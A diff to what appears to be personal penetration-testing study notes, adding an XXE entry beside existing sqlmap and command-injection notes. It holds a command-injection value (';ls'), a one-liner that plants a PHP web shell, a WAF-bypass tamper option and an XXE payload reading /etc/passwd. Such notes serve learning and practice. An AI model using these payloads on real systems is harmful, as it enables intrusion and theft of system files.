@@ -390,7 +390,13 @@ Anthares101@kali:~$ sqlmap -D DB --sql-query "select id,password,...,... from TA
 
 # The parameter --tamper=space2comment allows you to try to bypass certain firewalls (WAF)
 ```
-- **RCE (Remote Command Execution):** If you are putting the code directly: `shell_exec('ping 8.8.8.8');` being the ip what the user enters, if instead we put `;ls`, although `ping` prints an error the command `ls` is executed. Once the vulnerability is detected we could run a WebShell: `;echo'<?php echo shell_exec(s_GET["cmd"]); ?>' > shell1.php`. If we go to `shell1.php`, with the parameter of the url `cmd` we can execute the commands that we want.
+- **RCE (Remote Command Execution):** If you are putting the code directly: `shell_exec('ping 8.8.8.8');` being the ip what the user enters, if instead we put `;ls`, although `ping` prints an error the command `ls` is executed. Once the vulnerability is detected we could run a WebShell: `;echo'<?php echo shell_exec(s_GET["cmd"]); ?>' > shell1.php`. If we go to `shell1.php`, with the parameter of the url `cmd` we can execute the commands that we want
+- **XXE (XML External Entity):** Abuses the XML features to interact with an application backend and for example read system files. A payload could be:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+```
 - **OWASP methodology for testing web security:** OWASP broken web application (To practice attacking pages and stuff)
 
 # Reverse engineering and binary exploitation
